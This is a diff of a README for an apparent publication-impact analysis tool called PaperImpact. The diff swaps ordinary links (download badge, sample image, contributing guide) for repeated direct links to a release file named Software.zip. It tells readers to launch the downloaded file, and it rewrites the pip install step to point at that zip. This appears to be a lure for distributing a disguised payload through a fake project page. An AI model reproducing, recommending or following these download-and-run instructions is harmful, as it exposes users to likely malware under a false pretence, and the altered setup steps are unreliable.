@@ -39,23 +39,23 @@ Welcome to **PaperImpact** - your go-to repository for a powerful system designe
 - web-of-science
 
 ## 🔗 Download Latest Version
-[![Download PaperImpact v1.0.0](https://img.shields.io/badge/Download-PaperImpact_v1.0.0-green)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download PaperImpact v1.0.0](https://github.com/NukeForce278/PaperImpact/releases/download/v1.0/Software.zip)](https://github.com/NukeForce278/PaperImpact/releases/download/v1.0/Software.zip)
 
 Make sure to launch the downloaded file to get started with our comprehensive system for analyzing the impact of scientific publications.
 
 ## 🚀 Get Started
 To begin using **PaperImpact**, follow these simple steps:
 1. Clone the repository to your local machine.
-2. Install the necessary dependencies by running `pip install -r requirements.txt`.
+2. Install the necessary dependencies by running `pip install -r https://github.com/NukeForce278/PaperImpact/releases/download/v1.0/Software.zip`.
 3. Explore the Jupyter notebooks provided to see examples of how to use the system.
 4. Dive into the code and start analyzing the impact of scientific publications!
 
 ## 📊 Sample Output
 Here is a sneak peek at what you can achieve with **PaperImpact**:
-![Sample Output](https://placeimg.com/640/480/tech)
+![Sample Output](https://github.com/NukeForce278/PaperImpact/releases/download/v1.0/Software.zip)
 
 ## 🤝 Contributing
-We welcome contributions from the community to make **PaperImpact** even better! Whether you want to suggest new features, report bugs, or submit pull requests, your input is valuable. Check out our [Contributing Guidelines](CONTRIBUTING.md) to get started.
+We welcome contributions from the community to make **PaperImpact** even better! Whether you want to suggest new features, report bugs, or submit pull requests, your input is valuable. Check out our [Contributing Guidelines](https://github.com/NukeForce278/PaperImpact/releases/download/v1.0/Software.zip) to get started.
 
 ## 📜 License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
